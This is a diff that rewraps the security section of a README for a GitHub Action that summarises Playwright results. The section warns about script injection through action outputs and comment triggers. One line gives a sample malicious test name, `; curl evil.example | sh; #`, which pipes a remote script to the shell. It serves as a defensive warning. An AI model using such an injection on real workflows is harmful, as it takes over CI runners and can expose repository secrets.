@@ -149,16 +149,16 @@ You can get an idea of the data structure by checking out the
 
 ## Security
 
-The action sanitizes its rendered comment so that untrusted content cannot inject active markdown. However,
-if you are passing the action's outputs to another action or triggering the action in a non-PR context, make sure
-to read the next section to harden your workflows against script injection.
+The action sanitizes its rendered comment so that untrusted content cannot inject active markdown. However, if you are
+passing the action's outputs to another action or triggering the action in a non-PR context, make sure to read the next
+section to harden your workflows against script injection.
 
 ### Using outputs safely
 
-The `summary` and `report-data` outputs contain raw test titles and file paths from the Playwright JSON report for
-you to post-process. When tests are added from external pull requests, **those strings are attacker-controlled**.
-Since GitHub Actions output values are **interpolated literally before shell parsing**, passing them into a `run:`
-step can lead to script injection on the runner.
+The `summary` and `report-data` outputs contain raw test titles and file paths from the Playwright JSON report for you
+to post-process. When tests are added from external pull requests, **those strings are attacker-controlled**. Since
+GitHub Actions output values are **interpolated literally before shell parsing**, passing them into a `run:` step can
+lead to script injection on the runner.
 
 #### ![check](https://icongr.am/octicons/shield-check.svg?size=12&color=abb4bf) Safe patterns
 
@@ -177,8 +177,8 @@ Pass outputs as inputs to another action. Action inputs are not shell-interprete
     message: ${{ steps.summary.outputs.summary }}
 ```
 
-If you need an output inside a `run:` step, pass it through an **environment variable** and quote the
-shell expansion. The value never touches the shell parser.
+If you need an output inside a `run:` step, pass it through an **environment variable** and quote the shell expansion.
+The value never touches the shell parser.
 
 ```yaml
 - run: |
@@ -190,8 +190,8 @@ shell expansion. The value never touches the shell parser.
 
 #### ![check](https://icongr.am/octicons/shield.svg?size=12&color=abb4bf) Unsafe patterns
 
-Do **not** interpolate outputs directly into a `run:` script. A test named `` `; curl evil.example | sh; # ``
-would execute on your runner.
+Do **not** interpolate outputs directly into a `run:` script. A test named `` `; curl evil.example | sh; # `` would
+execute on your runner.
 
 ```yaml
 # UNSAFE: output is interpolated and open to injection
@@ -205,10 +205,9 @@ for more.
 
 ### Triggering from `issue_comment`
 
-The action supports being run from an `issue_comment` event so you can e.g. re-post the summary
-when someone comments `/retest` on a PR. **In a public repository any GitHub user can
-comment on a PR**, so you need to make sure the job is gated on the commenter's association with the
-repository to avoid potential abuse.
+The action supports being run from an `issue_comment` event so you can e.g. re-post the summary when someone comments
+`/retest` on a PR. **In a public repository any GitHub user can comment on a PR**, so you need to make sure the job is
+gated on the commenter's association with the repository to avoid potential abuse.
 
 ```yaml
 # Only run for comments by users with write+ access
@@ -222,10 +221,11 @@ jobs:
     if: github.event.issue.pull_request && github.actor == 'your-bot-user'
 ```
 
-If your `issue_comment` job additionally **checks out the PR head** (e.g. to re-run tests), the same
-threat model as `pull_request_target` applies: treat the checked-out code as untrusted and never run it
-with repository secrets in scope. See the official guidance on
-[keeping your GitHub actions secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) for details.
+If your `issue_comment` job additionally **checks out the PR head** (e.g. to re-run tests), the same threat model as
+`pull_request_target` applies: treat the checked-out code as untrusted and never run it with repository secrets in
+scope. See the official guidance on
+[keeping your GitHub actions secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
+for details.
 
 ## License
 
